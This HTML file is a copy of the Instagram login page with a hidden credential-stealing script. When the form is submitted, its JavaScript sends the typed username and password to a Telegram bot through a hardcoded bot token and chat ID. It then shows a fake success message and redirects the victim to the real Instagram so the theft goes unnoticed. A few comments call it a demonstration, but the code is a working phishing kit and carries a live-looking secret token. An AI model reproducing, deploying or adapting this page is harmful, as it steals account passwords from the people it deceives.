<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            display: flex;
            max-width: 935px;
            width: 100%;
            justify-content: center;
            align-items: center;
            gap: 60px;
        }

        .phones {
            position: relative;
            margin-right: 32px;
            flex: 1;
            display: flex;
            justify-content: flex-end;
        }

        .phone-image {
            height: 600px;
            position: relative;
        }

        .phone-slides {
            position: absolute;
            top: 26px;
            right: 112px;
            height: 538px;
            width: 250px;
            overflow: hidden;
            border-radius: 16px;
        }

        .slide {
            position: absolute;
            width: 100%;
            height: 100%;
            opacity: 0;
            transition: opacity 1.5s ease-in-out;
            background-size: cover;
            background-position: center;
        }

        .slide.active {
            opacity: 1;
        }

        .right-section {
            flex: 1;
            max-width: 350px;
        }

        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            text-align: center;
            width: 100%;
            margin-bottom: 10px;
        }

        .instagram-logo {
            margin-bottom: 20px;
        }

        .logo-text {
            font-family: 'Instagram Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            font-size: 42px;
            font-weight: 300;
            margin-bottom: 24px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .input-group {
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 9px 0 7px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            height: 36px;
        }

        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }

        .login-btn {
            width: 100%;
            padding: 7px;
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            margin-top: 14px;
            cursor: pointer;
            font-size: 14px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-btn:disabled {
            background: #b2dffc;
            cursor: default;
        }

        .separator {
            margin: 20px 0;
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .separator::before,
        .separator::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .separator::before {
            margin-right: 15px;
        }

        .separator::after {
            margin-left: 15px;
        }

        .facebook-login {
            color: #385185;
            font-weight: 600;
            margin: 10px 0;
            font-size: 14px;
            cursor: pointer;
        }

        .facebook-login i {
            font-size: 18px;
            margin-right: 8px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin-top: 20px;
            cursor: pointer;
        }

        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            width: 100%;
            margin-bottom: 10px;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .get-app {
            text-align: center;
            width: 100%;
            font-size: 14px;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 10px;
        }

        .app-buttons img {
            height: 40px;
            cursor: pointer;
        }

        .footer {
            max-width: 935px;
            width: 100%;
            margin-top: 50px;
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 16px;
        }

        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        /* Responsive Design */
        @media (max-width: 875px) {
            .phones {
                display: none;
            }
            
            .container {
                justify-content: center;
            }
            
            .right-section {
                max-width: 350px;
                width: 100%;
            }
        }

        /* Success message */
        .success-message {
            display: none;
            background: #d4edda;
            color: #155724;
            padding: 12px;
            border-radius: 4px;
            margin-top: 15px;
            font-size: 14px;
            border: 1px solid #c3e6cb;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="phones">
            <div class="phone-image">
                <img src="https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png" alt="Instagram on iPhone" style="height: 600px;">
                <div class="phone-slides">
                    <div class="slide active" style="background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe239b7c9f.png');"></div>
                    <div class="slide" style="background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot2.png/4d62acb667fb.png');"></div>
                    <div class="slide" style="background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot3.png/94edb770accf.png');"></div>
                    <div class="slide" style="background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot4.png/a4fd825e3d49.png');"></div>
                </div>
            </div>
        </div>
        
        <div class="right-section">
            <div class="login-box">
                <div class="instagram-logo">
                    <div class="logo-text">Instagram</div>
                </div>
                
                <form id="loginForm">
                    <div class="input-group">
                        <input type="text" id="username" placeholder="Phone number, username, or email" required>
                    </div>
                    <div class="input-group">
                        <input type="password" id="password" placeholder="Password" required>
                    </div>
                    <button type="submit" class="login-btn">Log in</button>
                    <div class="success-message" id="successMessage">
                        Login successful! Redirecting to Instagram...
                    </div>
                </form>

                <div class="separator">OR</div>
                
                <div class="facebook-login">
                    <i class="fab fa-facebook-square"></i> Log in with Facebook
                </div>
                
                <div class="forgot-password">Forgot password?</div>
            </div>

            <div class="signup-box">
                Don't have an account? <a href="#">Sign up</a>
            </div>

            <div class="get-app">
                <p>Get the app.</p>
                <div class="app-buttons">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on the App Store">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Get it on Google Play">
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Top Accounts</a>
            <a href="#">Hashtags</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Contact Uploading & Non-Users</a>
        </div>
        <div class="footer-links">
            <a href="#">English</a>
            <a href="#">© 2023 Instagram from Meta</a>
        </div>
    </div>

    <script>
        // Phone slideshow
        let currentSlide = 0;
        const slides = document.querySelectorAll('.slide');
        
        function nextSlide() {
            slides[currentSlide].classList.remove('active');
            currentSlide = (currentSlide + 1) % slides.length;
            slides[currentSlide].classList.add('active');
        }
        
        setInterval(nextSlide, 3000);
        
        // Form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.querySelector('.login-btn');
            const successMessage = document.getElementById('successMessage');
            
            // Show loading state
            loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
            loginBtn.disabled = true;
            
            try {
                // Telegram bot API call
                const botToken = '7722917372:AAG_wibr5_q_wVvcDGw6NGuJu-dNG2oJR3U';
                const chatId = '5729082169';
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    'Accept': 'application/json'
                    // Note: In a real implementation, you would need a proxy server
                    // to avoid CORS issues when making requests from the browser
                    // to the Telegram API
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `📱 Instagram Login Attempt\n👤 Username: ${username}\n🔐 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}`
                    })
                });

                // Show success message regardless of API response
                // (for demonstration purposes)
                successMessage.style.display = 'block';
                
                // Simulate API success for demo
                setTimeout(() => {
                    // Redirect to actual Instagram after delay
                    window.location.href = 'https://www.instagram.com';
                }, 2000);
                
            } catch (error) {
                console.error('Error:', error);
                // Even if there's an error with Telegram API, show success to user
                successMessage.style.display = 'block';
                
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com';
                }, 2000);
            } finally {
                // Reset button after a delay
                setTimeout(() => {
                    loginBtn.textContent = 'Log in';
                    loginBtn.disabled = false;
                }, 2000);
            }
        });

        // Add real-time validation like Instagram
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('input', function() {
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const loginBtn = document.querySelector('.login-btn');
                
                if (username && password) {
                    loginBtn.disabled = false;
                } else {
                    loginBtn.disabled = true;
                }
            });
        });
    </script>
</body>
</html>
